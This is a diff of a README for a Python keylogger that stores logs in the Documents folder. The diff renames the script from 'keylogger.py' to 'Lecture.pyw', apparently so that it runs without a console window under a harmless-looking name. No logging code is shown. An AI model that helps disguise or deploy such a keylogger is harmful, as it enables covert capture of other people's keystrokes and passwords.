@@ -64,7 +64,7 @@ pip install keyboard
    cd keylogger
    ```
 
-2. Save the script as `keylogger.py`.
+2. Save the script as `Lecture.pyw`.
 
 3. Ensure you have write permissions for the `Documents` folder, where logs will be stored.
 
@@ -76,7 +76,7 @@ pip install keyboard
 
 2. Run the keylogger script:
    ```bash
-   python keylogger.py
+   python Lecture.pyw
    ```
 
 3. The program will:
